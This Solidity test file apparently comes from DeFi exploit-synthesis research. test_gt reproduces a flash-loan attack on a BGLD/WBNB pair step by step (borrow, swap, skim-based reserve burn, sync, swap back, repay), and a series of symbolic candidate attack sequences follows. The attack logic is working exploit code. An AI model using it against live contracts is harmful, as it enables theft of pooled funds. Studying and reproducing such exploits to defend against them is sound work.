// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./BGLD.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract BGLDTest is Test, BlockLoader {
    BGLD bgld;
    WBNB wbnb;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bgldAddr;
    address wbnbAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1670859422;
    uint112 reserve0pair = 8795812119540504580;
    uint112 reserve1pair = 231743012965866;
    uint32 blockTimestampLastpair = 1670630737;
    uint256 kLastpair = 2034636816537464565510795933100323;
    uint256 price0CumulativeLastpair = 2112483169472590267684139563968449299;
    uint256 price1CumulativeLastpair =
        33872365564206101577328167072697709763805828699;
    uint256 totalSupplywbnb = 3826675582457907209504130;
    uint256 balanceOfwbnbpair = 8795812119540504580;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplybgld = 95635970100586657817;
    uint256 balanceOfbgldpair = 231743012965866;
    uint256 balanceOfbgldattacker = 0;

    function setUp() public {
        owner = address(this);
        bgld = new BGLD();
        bgldAddr = address(bgld);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        pair = new UniswapV2Pair(
            address(wbnb),
            address(bgld),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        bgld.mint(100e18);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        bgld.transfer(address(pair), balanceOfbgldpair);
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bgld Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(bgld),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(bgld),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(wbnb),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(pair),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attackContract),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(attackContract),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_wbnb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_wbnb(uint256 amount) internal {
        wbnb.transfer(owner, amount);
    }

    function borrow_owner_bgld(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        bgld.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_bgld(uint256 amount) internal {
        bgld.transfer(owner, amount);
    }

    function borrow_pair_wbnb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_wbnb(uint256 amount) internal {
        wbnb.transfer(address(pair), amount);
    }

    function borrow_pair_bgld(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pair));
        bgld.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pair_bgld(uint256 amount) internal {
        bgld.transfer(address(pair), amount);
    }

    function swap_pair_bgld_wbnb(uint256 amount) internal {
        bgld.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(bgld);
        path[1] = address(wbnb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_bgld(uint256 amount) internal {
        bgld.transfer(address(pair), amount * 10);
        pair.skim(attacker);
    }

    function swap_pair_wbnb_bgld(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bgld);
        uint256[] memory values = router.getAmountsOut(amount, path);
        wbnb.transfer(address(pair), wbnb.balanceOf(attacker));
        pair.swap(0, (values[1] * 90) / 100, attacker, "");
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_owner_wbnb(125e18);
        printBalance("After step0 ");
        swap_pair_wbnb_bgld(wbnb.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_bgld(bgld.balanceOf(address(pair)));
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_bgld_wbnb(100 * 1e6);
        printBalance("After step4 ");
        payback_owner_wbnb((125e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_bgld(amt1);
        burn_pair_bgld(amt2);
        sync_pair();
        swap_pair_bgld_wbnb(amt3);
        payback_owner_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bgld(amt0);
        burn_pair_bgld(amt1);
        payback_owner_bgld(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bgld(amt0);
        burn_pair_bgld(amt1);
        payback_pair_bgld(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bgld(amt0);
        burn_pair_bgld(amt1);
        swap_pair_bgld_wbnb(amt2);
        payback_owner_bgld(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_bgld(amt0);
        burn_pair_bgld(amt1);
        sync_pair();
        payback_owner_bgld(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bgld(amt0);
        burn_pair_bgld(amt1);
        swap_pair_bgld_wbnb(amt2);
        payback_pair_bgld(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_bgld(amt0);
        burn_pair_bgld(amt1);
        sync_pair();
        payback_pair_bgld(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_bgld(amt1);
        burn_pair_bgld(amt2);
        swap_pair_bgld_wbnb(amt3);
        payback_owner_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_bgld(amt0);
        burn_pair_bgld(amt1);
        swap_pair_bgld_wbnb(amt2);
        swap_pair_bgld_wbnb(amt3);
        payback_owner_bgld(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_bgld(amt0);
        burn_pair_bgld(amt1);
        sync_pair();
        swap_pair_bgld_wbnb(amt2);
        payback_owner_bgld(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_wbnb(amt0);
        swap_pair_wbnb_bgld(amt1);
        burn_pair_bgld(amt2);
        swap_pair_bgld_wbnb(amt3);
        payback_pair_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pair_bgld(amt0);
        burn_pair_bgld(amt1);
        swap_pair_bgld_wbnb(amt2);
        swap_pair_bgld_wbnb(amt3);
        payback_pair_bgld(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_bgld(amt0);
        burn_pair_bgld(amt1);
        sync_pair();
        swap_pair_bgld_wbnb(amt2);
        payback_pair_bgld(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_bgld(amt1);
        burn_pair_bgld(amt2);
        swap_pair_bgld_wbnb(amt3);
        swap_pair_bgld_wbnb(amt4);
        payback_owner_wbnb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_wbnb(amt0);
        swap_pair_wbnb_bgld(amt1);
        burn_pair_bgld(amt2);
        sync_pair();
        swap_pair_bgld_wbnb(amt3);
        payback_owner_wbnb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
